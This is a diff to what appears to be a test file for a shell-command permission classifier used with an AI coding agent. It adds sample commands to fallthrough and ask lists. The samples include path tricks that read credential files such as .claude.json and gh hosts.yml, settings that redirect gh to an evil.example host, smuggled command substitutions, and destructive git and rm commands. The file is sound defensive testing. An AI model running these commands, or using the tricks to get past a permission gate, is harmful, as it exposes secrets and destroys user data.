@@ -38,6 +38,9 @@ ALLOW = [
     "find . -name '*.py' -type f | wc -l", "jq .a /tmp/x.json", "diff -u README.md /tmp/x", "python3 %s/scripts/memory-admission.py check --weight heavy" % MV,
 ]
 FALLTHROUGH = [
+    "cd zz; cd ../..; cat .claude.json", "cd zz || cd ../..; cat .claude.json", "for x in 1 2; do cd ..; done; cat .claude.json", "cat ~+/../../.claude.json",
+    "cd ~; cd /tmp; cat ~-/.claude.json", "cdpath=~/.config; cd gh; cat hosts.yml", "path=/tmp/x; ls", "GH_HOST=evil.example; gh pr view 1 --repo o/r",
+    "RIPGREP_CONFIG_PATH=/x; ls", "gh pr view https://evil.example/o/r/pull/1", "gh pr view 1 --repo evil.example/o/r", "cat ~/.sentryclirc",
     "printf -vx y", "printf -- '%s' a",
     "printf -v 'a[$(echo X)]' x", "[ -v 'a[$(echo X)]' ]", "test -v x", "for PATH in /tmp; do cat x; done", "for HOME in /tmp; do ls; done", "rtk grep x . -- --pre ./a.sh",
     "rtk grep x . -- --hidden", "rtk grep . . -g '.[e]nv'", "rtk grep . ~/Bryant-Developments", "rtk grep . ..", "gh pr view 1 --json body -cq env", "git diff --help", "git log -h",
@@ -57,6 +60,8 @@ FALLTHROUGH = [
     "tree --output=/tmp/x", "file -C -m /tmp/x", "cd -", "cd -P x", "git branch newname", "git branch -f x", "awk 'BEGIN{ARGV[1]=\".env\"}1' README.md", "tree -I -o x", "echo a;; echo b",
 ]
 ASK = [
+    "gh --repo o/r pr merge 5", "gh -R o/r pr merge 5", "git push origin :main", "git branch -rd origin/x", "git reset --ha", "rm a -rf $(x)", "git restore .", "git checkout -f x",
+    "git update-ref -d refs/heads/x", "git gc --prune=now",
     "cat ~/.CLAUDE.json", "cat ~/.Claude/.credentials.json", "cat ~/.claude.json.backup", "cat ~/**/.claude.json", "cat ~/.codex/auth.json", "cat ~/.wrangler/config/default.toml",
     "cat ~/.cache/gh/x", "FOO=1 ls; pkill x", "ls > o; pkill x", "ls $(x); rm -rf /", "env X=1 rm -rf x", "sudo -n rm -rf x", "/bin/rm -rf x",
     "xargs rm -rf", "rm --rec x", "find . -delete", "git push --force-with-lease", "git push origin +main", "git push -f", "git reset --hard HEAD~1", "git clean -fd",
